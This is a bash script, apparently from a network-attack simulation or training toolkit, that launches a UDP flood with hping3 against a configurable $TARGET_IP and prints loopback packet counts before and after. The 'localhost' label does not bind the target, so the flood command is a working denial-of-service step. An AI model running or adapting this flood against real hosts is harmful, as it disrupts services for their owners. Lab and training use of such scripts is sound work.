#!/bin/bash
# UDP Flood Simulation
source ../config.cfg
source utils.sh

run_udp_flood() {
    clear
    echo -e "${CYAN}Starting UDP Flood Simulation (Localhost)...${NC}"
    echo -e "${YELLOW}Sending $UDP_COUNT UDP packets to random ports${NC}"
    
    # Start monitoring
    echo -e "\n${GREEN}[+] Network status before:${NC}"
    ifconfig lo | grep 'RX packets'
    
    # Launch UDP flood
    echo -e "\n${RED}[+] Flooding UDP packets...${NC}"
    hping3 --udp -c $UDP_COUNT --flood $TARGET_IP 2>/dev/null
    
    # Results
    echo -e "\n${GREEN}[+] Simulation complete!${NC}"
    echo -e "Sent $UDP_COUNT UDP packets to $TARGET_IP"
    ifconfig lo | grep 'RX packets'
    
    log_event "UDP_Flood" "Packets:$UDP_COUNT"
}

run_udp_flood
read -p "Press Enter to return to main menu..."
